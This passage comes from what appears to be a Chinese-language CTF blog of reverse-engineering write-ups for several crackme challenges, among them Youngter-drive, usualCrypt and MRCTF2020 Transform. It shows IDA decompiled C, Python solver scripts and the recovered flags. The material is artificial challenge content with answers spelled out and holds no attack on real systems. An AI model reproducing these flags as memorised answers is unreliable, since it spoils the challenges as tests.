class="number">0</span>] = v7;</span><br><span class="line">  v5[<span class="number">1</span>] = v8;</span><br><span class="line">  v5[<span class="number">2</span>] = v9;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[i] != byte_402000[*((<span class="type">char</span> *)v5 + i) - <span class="number">1</span>] )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You are correct!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一看就是简单的古典密码而已，直接脚本出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;*F&#x27;\&quot;N,\&quot;(I?+@&quot;</span></span><br><span class="line">dic = <span class="string">r&quot;&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(&quot;</span> + <span class="built_in">chr</span>(<span class="number">0x27</span>) + <span class="string">&quot;&amp;%$# !\&quot;&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dic)):</span><br><span class="line">        <span class="keyword">if</span> dic[j] == s[i]:</span><br><span class="line">            flag += <span class="built_in">chr</span>(j+<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span> + flag + <span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"><span class="comment"># flag&#123;U9X_1S_W6@T?&#125;</span></span><br></pre></td></tr></table></figure><h3 id="buu、Youngter-drive"><a href="#buu、Youngter-drive" class="headerlink" title="buu、Youngter-drive"></a>buu、Youngter-drive</h3><p>首先给的是exe文件就先验验壳，UPX壳，直接脱了。</p><p>或者使用OD手工脱了，<a href="https://blog.csdn.net/kevin66654/article/details/79135861">关于OD的手工脱壳的教程</a>。</p><p>然后拉入ida32简单分析。注意到创建了两个单独的线程来进行加密，两个线程的函数分别为<code>StartAddress</code>、<code>sub_41119F</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    HANDLE v4; <span class="comment">// [esp+D0h] [ebp-14h]</span></span><br><span class="line">    HANDLE hObject; <span class="comment">// [esp+DCh] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">    ((<span class="type">void</span> (*)(<span class="type">void</span>))sub_4110FF)();</span><br><span class="line">    ::hObject = CreateMutexW(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    j_strcpy(Destination, &amp;Source);</span><br><span class="line">    </span><br><span class="line">    hObject = CreateThread(<span class="number">0</span>, <span class="number">0</span>, StartAddress, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    v4 = CreateThread(<span class="number">0</span>, <span class="number">0</span>, sub_41119F, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    CloseHandle(hObject);</span><br><span class="line">    CloseHandle(v4);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ( dword_418008 != <span class="number">-1</span> )</span><br><span class="line">        ;</span><br><span class="line">    sub_411190();</span><br><span class="line">    CloseHandle(::hObject);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然创建了两个线程，但是第二线程似乎只是为了Sleep而创建的，所以只有<code>StartAddress</code>函数是具有功能的。深入跟进该函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line"><span class="type">char</span> *__cdecl <span class="title function_">sub_411940</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *result; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">char</span> v3; <span class="comment">// [esp+D3h] [ebp-5h]</span></span><br><span class="line"></span><br><span class="line">    v3 = *(_BYTE *)(a2 + a1);</span><br><span class="line">    <span class="keyword">if</span> ( (v3 &lt; <span class="number">97</span> || v3 &gt; <span class="number">122</span>) &amp;&amp; (v3 &lt; <span class="number">65</span> || v3 &gt; <span class="number">90</span>) )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt; <span class="number">97</span> || v3 &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        result = off_418000[<span class="number">0</span>];</span><br><span class="line">        *(_BYTE *)(a2 + a1) = off_418000[<span class="number">0</span>][*(<span class="type">char</span> *)(a2 + a1) - <span class="number">38</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        result = off_418000[<span class="number">0</span>];</span><br><span class="line">        *(_BYTE *)(a2 + a1) = off_418000[<span class="number">0</span>][*(<span class="type">char</span> *)(a2 + a1) - <span class="number">96</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然最上面提示了堆栈不平衡，但是ida7.5依然分析出了该功能的c代码。上面的a2对应的就是那个一直在自减一的<code>dword_418008</code>，表示字符串的窗口挪动？而后面的那个线程似乎只做了字符串窗口移动的动作。这个应该是一个从后向前推导的过程，但是简单分析了一下，这样似乎不行，看了别人的wp，发现应该是后面还有一位的，这里进行验证的是29位，但是其实进行加密的是30位，这样就满足了，由此得出逆向的python脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">off_418000 = <span class="string">&#x27;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&#x27;</span></span><br><span class="line">off_418004 = <span class="string">&#x27;TOiZiZtOrYaToUwPnToBsOaOapsySy&#x27;</span>  <span class="comment"># 在从ida得来的字符串的最后加上一位(随意的字符)，经测试，只有在第三十位字符是y的情况下得出的flag才是正确的</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(off_418004)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        flag += off_418004[i]</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    tmp = off_418000.index(off_418004[i])  <span class="comment"># 用tmp的值代表检验字符串在加密表字符串的位置(下标)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span>(tmp + <span class="number">38</span>).isupper():</span><br><span class="line">        flag += <span class="built_in">chr</span>(tmp + <span class="number">38</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(tmp + <span class="number">96</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># ThisisthreadofwindowshahaIsESE</span></span><br></pre></td></tr></table></figure><p>最后一位是y时得到的flag才是正确的。。。</p><p>另外加密的时候<code>*(_BYTE *)(a2 + a1)</code>代表的是地址，所以后面的<code>*(char *)(a2 + a1)</code>应该也是地址类似的东西，在数组里面也只有下标了，总之这道题做得挺蒙的。。。</p><h3 id="ACTF新生赛2020-usualCrypt"><a href="#ACTF新生赛2020-usualCrypt" class="headerlink" title="[ACTF新生赛2020]usualCrypt"></a>[ACTF新生赛2020]usualCrypt</h3><p><strong>TAG:换表base64、大小写互相转换</strong></p><p>查壳无壳</p><p><img src="/2021/05/28/CTF//image-20210607180229271.png"></p><p>直接先使用ida32打开看一看</p><p><img src="/2021/05/28/CTF//image-20210607180359872.png"></p><p>找到关键的字符串，一路跟踪进去发现关键函数，内容如下(其实就是逆出来的main函数)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5[<span class="number">3</span>]; <span class="comment">// [esp+8h] [ebp-74h] BYREF</span></span><br><span class="line">  __int16 v6; <span class="comment">// [esp+14h] [ebp-68h]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [esp+16h] [ebp-66h]</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">100</span>]; <span class="comment">// [esp+18h] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_403CF8(&amp;unk_40E140);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v8);</span><br><span class="line">  v5[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v5[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v5[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  sub_401080(v8, <span class="built_in">strlen</span>(v8), v5);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( *((_BYTE *)v5 + v3) == byte_40E0E4[v3] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ++v3 &gt; <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)v5) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_403CF8(aError);</span><br><span class="line">LABEL_6:</span><br><span class="line">  <span class="keyword">if</span> ( v3 - <span class="number">1</span> == <span class="built_in">strlen</span>(byte_40E0E4) )</span><br><span class="line">    result = sub_403CF8(aAreYouHappyYes);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = sub_403CF8(aAreYouHappyNo);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先看前面的这个函数</p><p><img src="/2021/05/28/CTF//image-20210607192629739.png"></p><p>跟进函数内部，很容易发现这就是一个换表的base64，原始的表为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</span><br></pre></td></tr></table></figure><p>注意到引用这串字符串的，有个函数专门用来换表，函数的内容如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_401000</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// cl</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( result = <span class="number">6</span>; result &lt; <span class="number">15</span>; ++result )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = byte_40E0AA[result];</span><br><span class="line">    byte_40E0AA[result] = byte_40E0A0[result];</span><br><span class="line">    byte_40E0A0[result] = v1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到上面<code>byte_40E0A0</code>和<code>byte_40E0A0</code>交换位置，ez，意思就是对原始的表从第六位开始和原始的表的第15位开始后的9位进行调换位置即可。</p><p>然后就是最后的这个了，一般情况下进行base的时候应该是没有这个的，这个逆出了这个说明有问题</p><p><img src="/2021/05/28/CTF//image-20210607194310914.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_401030</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(a1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = a1[HIDWORD(v1)];</span><br><span class="line">      <span class="keyword">if</span> ( v2 &lt; <span class="string">&#x27;a&#x27;</span> || v2 &gt; <span class="string">&#x27;z&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v2 &lt; <span class="string">&#x27;A&#x27;</span> || v2 &gt; <span class="string">&#x27;Z&#x27;</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">        LOBYTE(v1) = v2 + <span class="number">32</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        LOBYTE(v1) = v2 - <span class="number">32</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      a1[HIDWORD(v1)] = v1;</span><br><span class="line">LABEL_9:</span><br><span class="line">      LODWORD(v1) = <span class="number">0</span>;</span><br><span class="line">      ++HIDWORD(v1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( HIDWORD(v1) &lt; <span class="built_in">strlen</span>(a1) );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大小写相互转换，这里的逻辑大概清晰了，我们先找到加密后的flag如下</p><p><img src="/2021/05/28/CTF//image-20210607192901280.png"></p><p>这个应该就是flag转换后的样子，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9</span><br></pre></td></tr></table></figure><p>先把这个字符串大小写互换之后进行base64的换标解密，写出完整版的poc如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">enc_flag = <span class="string">&#x27;zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9&#x27;</span></span><br><span class="line">encflag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc_flag:</span><br><span class="line">    <span class="keyword">if</span> i.isupper():</span><br><span class="line">        encflag += i.lower()</span><br><span class="line">    <span class="keyword">elif</span> i.islower():</span><br><span class="line">        encflag += i.upper()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        encflag += i</span><br><span class="line"><span class="built_in">print</span>(encflag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 换表base64</span></span><br><span class="line">ss = s[:<span class="number">6</span>] + s[<span class="number">16</span>:<span class="number">16</span>+<span class="number">9</span>] + s[<span class="number">15</span>] + s[<span class="number">6</span>:<span class="number">6</span>+<span class="number">9</span>] + s[<span class="number">16</span>+<span class="number">9</span>:]</span><br><span class="line">table=<span class="built_in">str</span>.maketrans(ss,s)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.decode(base64.b64decode(encflag.translate(table))))</span><br><span class="line"><span class="comment"># flag&#123;bAse64_h2s_a_Surprise&#125;</span></span><br></pre></td></tr></table></figure><p>里面的换表的结果与原始表的排列是有关的，仔细看看那两个字符数组<code>byte_40E0A0</code>和<code>byte_40E0A0</code>就明白了。</p><h3 id="MRCTF2020-Transform"><a href="#MRCTF2020-Transform" class="headerlink" title="[MRCTF2020]Transform"></a>[MRCTF2020]Transform</h3><p><strong>TAG:简单异或</strong></p><p>首先是个exe可执行文件，先查一下是不是带壳的。</p><p><img src="/2021/05/28/CTF//image-20210608074332817.png"></p><p>64位无壳程序</p><p>拖入ida64位，找到关键函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> Str[<span class="number">104</span>]; <span class="comment">// [rsp+20h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_402230(argc, argv, envp);</span><br><span class="line">  sub_40E640(<span class="string">&quot;Give me your code:\n&quot;</span>);</span><br><span class="line">  sub_40E5F0(<span class="string">&quot;%s&quot;</span>, Str);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(Str) != <span class="number">33</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_40E640(<span class="string">&quot;Wrong!\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">32</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    byte_414040[i] = Str[dword_40F040[i]];</span><br><span class="line">    byte_414040[i] ^= LOBYTE(dword_40F040[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">32</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( byte_40F0E0[j] != byte_414040[j] )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_40E640(<span class="string">&quot;Wrong!\n&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_40E640(<span class="string">&quot;Right!Good Job!\n&quot;</span>);</span><br><span class="line">  sub_40E640(<span class="string">&quot;Here is your flag: %s\n&quot;</span>, Str);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到关键的数据有两个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dword_40F040 = [0x9, 0x0A, 0x0F, 0x17, 0x7, 0x18, 0x0C, 0x6, 0x1, 0x10, 0x3, 0x11, 0x20, 0x1D, 0x0B, 0x1E, 0x1B, 0x16,</span><br><span class="line">                0x4, 0x0D, 0x13, 0x14, 0x15, 0x2, 0x19, 0x5, 0x1F, 0x8, 0x12, 0x1A, 0x1C, 0x0E, 0x00]</span><br><span class="line">byte_40F0E0 = [0x67, 0x79, 0x7B, 0x7F, 0x75, 0x2B, 0x3C, 0x52, 0x53, 0x79, 0x57, 0x5E, 0x5D, 0x42, 0x7B, 0x2D, 0x2A,</span><br><span class="line">               0x66, 0x42, 0x7E, 0x4C, 0x57, 0x79, 0x41, 0x6B, 0x7E, 0x65, 0x3C, 0x5C, 0x45, 0x6F, 0x62, 0x4D]</span><br></pre></td></tr></table></figure><p><code>Str</code>是flag，这里先将<code>dword_40F040</code>作为flag字符串的下标，然后<code>byte_40F0E0 = flag[dword_40F040] ^ dword_40F040</code></p><p>意思就是这么个意思啦，直接逆，由异或的特性易知<code>flag[dword_40F040] = byte_40F0E0 ^ dword_40F040</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">dword_40F040 = [<span class="number">0x9</span>, <span class="number">0x0A</span>, <span class="number">0x0F</span>, <span class="number">0x17</span>, <span class="number">0x7</span>, <span class="number">0x18</span>, <span class="number">0x0C</span>, <span class="number">0x6</span>, <span class="number">0x1</span>, <span class="number">0x10</span>, <span class="number">0x3</span>, <span class="number">0x11</span>, <span class="number">0x20</span>, <span class="number">0x1D</span>, <span class="number">0x0B</span>, <span class="number">0x1E</span>, <span class="number">0x1B</span>, <span class="number">0x16</span>,</span><br><span class="line">                <span class="number">0x4</span>, <span class="number">0x0D</span>, <span class="number">0x13</span>, <span class="number">0x14</span>, <span class="number">0x15</span>, <span class="number">0x2</span>, <span class="number">0x19</span>, <span class="number">0x5</span>, <span class="number">0x1F</span>, <span class="number">0x8</span>, <span class="number">0x12</span>, <span class="number">0x1A</span>, <span class="number">0x1C</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>]</span><br><span class="line">byte_40F0E0 = [<span class="number">0x67</span>, <span class="number">0x79</span>, <span class="number">0x7B</span>, <span class="number">0x7F</span>, <span class="number">0x75</span>, <span class="number">0x2B</span>, <span class="number">0x3C</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x79</span>, <span class="number">0x57</span>, <span class="number">0x5E</span>, <span class="number">0x5D</span>, <span class="number">0x42</span>, <span class="number">0x7B</span>, <span class="number">0x2D</span>, <span class="number">0x2A</span>,</span><br><span class="line">               <span class="number">0x66</span>, <span class="number">0x42</span>, <span class="number">0x7E</span>, <span class="number">0x4C</span>, <span class="number">0x57</span>, <span class="number">0x79</span>, <span class="number">0x41</span>, <span class="number">0x6B</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0x3C</span>, <span class="number">0x5C</span>, <span class="number">0x45</span>, <span class="number">0x6F</span>, <span class="number">0x62</span>, <span class="number">0x4D</span>]</span><br><span class="line"></span><br><span class="line">flag = [<span class="number">0</span>] * <span class="built_in">len</span>(byte_40F0E0)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(byte_40F0E0)):</span><br><span class="line">    flag[dword_40F040[i]] = byte_40F0E0[i] ^ dword_40F040[i]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> flag))</span><br><span class="line"><span class="comment">#  MRCTF&#123;Tr4nsp0sltiON_Clph3r_1s_3z&#125;</span></span><br></pre></td></tr></table></figure><p>可以说是右手就行。</p><p><strong>注意下标的那个数组的最后一位补上0x00，要不不满足33位的条件，把那个最后的0x08换成0x00</strong></p><h2 id="Linux下文件逆向-elf文件逆向"><a href="#Linux下文件逆向-elf文件逆向" class="headerlink" title="Linux下文件逆向(elf文件逆向)"></a>Linux下文件逆向(elf文件逆向)</h2><h3 id="GXYCTF2019-luck-guy"><a href="#GXYCTF2019-luck-guy" class="headerlink" title="[GXYCTF2019]luck_guy"></a>[GXYCTF2019]luck_guy</h3><p><strong>关键代码寻找与审计</strong></p><p>这题应该是可以使用ida &amp; ubuntu实现动态调试的，但是我一看配置环境还要浪费许多时间，就直接进行逆向分析好了。下面的是get_flag()函数的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 